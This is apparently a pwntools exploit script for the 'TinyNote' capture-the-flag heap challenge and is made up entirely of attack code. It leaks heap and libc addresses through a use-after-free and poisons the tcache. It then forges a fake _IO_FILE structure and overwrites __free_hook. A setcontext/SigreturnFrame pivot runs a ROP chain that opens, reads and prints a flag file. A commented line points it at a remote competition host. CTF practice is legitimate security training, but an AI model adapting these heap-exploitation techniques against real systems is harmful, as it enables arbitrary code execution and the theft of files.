from pwn import *
sh = process('./TinyNote')
# sh = remote('49.233.37.105', 50103)
context.arch = "amd64"
#context.log_level = "debug"

def sendint(num):
    sh.send(str(num).ljust(0x20, '\x00'))


def choice(idx):
    sh.recvuntil("Choice:")
    sendint(idx)

def add(idx):
    choice(1)
    sh.recvuntil("Index:")
    sendint(idx)


def edit(idx, content):
    choice(2)
    sh.recvuntil("Index:")
    sendint(idx)
    sh.sendlineafter("Content:", str(content))


def show(idx):
    choice(3)
    sh.recvuntil("Index:")
    sendint(idx)


def delete(idx):
    choice(4)
    sh.recvuntil("Index:")
    sendint(idx)


def get_addr(addr):
    edit(1, p64(1))
    edit(2, p64(addr))
    add(0)


add(0)
delete(0)
show(0)
sh.recvuntil('Content:')
heap_base = u64(sh.recv(6).ljust(8, '\x00')) << 12
log.success("heap_base:\t" + hex(heap_base))

edit(0, '\x00' * 0x10)
delete(0)
edit(0, p64(heap_base >> 12 ^ (heap_base + 0x10)))
add(0)
add(1)

delete(0)
edit(0, '\x00' * 0x10)
delete(0)
edit(0, p64(heap_base >> 12 ^ (heap_base + 0x90)))
add(0)
add(2)

for i in range(7):
    delete(1)
    edit(1, '\x00' * 0x10)
delete(1)
show(1)
libc_base = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1e0c00
log.success("libc_base:\t" + hex(libc_base))

edit(1, p64(7))
delete(0)

for i in range(8):
    get_addr(heap_base + 0x2c0 + i * 2 * (0x10))
    edit(0, p64(0) + p64(0x21))

for i in range(6):
    get_addr(heap_base + 0x2c0 + (i * 2 + 1) * (0x10))
    edit(1, p64(7))
    delete(0)

stderr_addr = libc_base + 0x1e15e0
IO_str_jumps = libc_base + 0x1e2560
pop_rdi_addr = libc_base + 0x28a55
pop_rsi_addr = libc_base + 0x2a4cf
pop_rdx_addr = libc_base + 0xc7f32
pop_rax_addr = libc_base + 0x44c70
syscall_addr = libc_base + 0x6105a
gadget_addr = libc_base + 0x14a0a0 #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
free_hook_addr = libc_base + 0x1e3e20
malloc_hook_addr = libc_base + 0x1e0b90
system_addr = libc_base + 0x4fa60
bin_sh_addr = libc_base + 0x1abf05
setcontext_addr = libc_base + 0x52970


get_addr(heap_base + 0x2a0)
edit(0, p64((heap_base + 0x2a0) >> 12 ^ (stderr_addr + 0x68 - 0x18)))

edit(1, p64(0))
add(0) #fastbin into tcache


new_size = 0x398
copy_heap_addr = heap_base + 0x2a0
next_chain = 0
old_blen = (new_size - 100) // 2
fake_IO_FILE = p64(0) * 2 #set tcache 0xc0
fake_IO_FILE += p64(0)  # _IO_write_base = 0
fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(copy_heap_addr)  # _IO_buf_base
fake_IO_FILE += p64(copy_heap_addr + old_blen)  # _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(next_chain) # _chain
fake_IO_FILE += p16(1) #tcache count 0x3a0
fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')
fake_IO_FILE += p64(IO_str_jumps + 0x18 - 0x18)  #vtable
fake_IO_FILE = fake_IO_FILE.ljust(0x230, '\x00')
fake_IO_FILE += p64(free_hook_addr) #tcache 0x3a0

for i in range(0, len(fake_IO_FILE), 0x10):
    get_addr(heap_base + 0x20 + i)
    edit(0, fake_IO_FILE[i:i + 0x10])


fake_frame_addr = free_hook_addr
frame = SigreturnFrame()
frame.rdi = fake_frame_addr + 0xF8
frame.rsi = 0
frame.rdx = 0x200
frame.rsp = fake_frame_addr + 0xF8 + 0x18
frame.rip = pop_rdi_addr + 1  # : ret

#leak flag name

# rop_data = [
#     pop_rax_addr,  # sys_open('./', 0)
#     2,
#     syscall_addr,
#     pop_rax_addr,  # sys_getdents(fd, heap, 0x200)
#     78,
#     pop_rdi_addr,
#     3,
#     pop_rsi_addr,
#     fake_frame_addr + 0x200,
#     syscall_addr,
#
#     pop_rax_addr,  # sys_write(1, heap, 0x200)
#     1,
#     pop_rdi_addr,
#     1,
#     pop_rsi_addr,
#     fake_frame_addr + 0x200,
#     syscall_addr
# ]
# payload = p64(gadget_addr) + p64(free_hook_addr) + '\x00' * 0x10
# payload += p64(setcontext_addr + 61) + str(frame).ljust(0xF8, '\x00')[0x28:] + './'.ljust(0x18, '\x00') + flat(rop_data)

rop_data = [
    pop_rax_addr,  # sys_open('flag', 0)
    2,
    syscall_addr,
    pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
    0,
    pop_rdi_addr,
    3,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    syscall_addr,

    pop_rax_addr,  # sys_write(1, heap, 0x100)
    1,
    pop_rdi_addr,
    1,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    syscall_addr
]
payload = p64(gadget_addr) + p64(free_hook_addr) + '\x00' * 0x10
payload += p64(setcontext_addr + 61) + str(frame).ljust(0xF8, '\x00')[0x28:] + 'haha_flag_3024'.ljust(0x18, '\x00') + flat(rop_data)

for i in range(0, len(payload), 0x10):
    get_addr(heap_base + 0x2a0 + i)
    edit(0, payload[i:i + 0x10])

edit(1, p16(1))
edit(2, p64(free_hook_addr))

#gdb.attach(sh)
add(0)
sh.interactive()
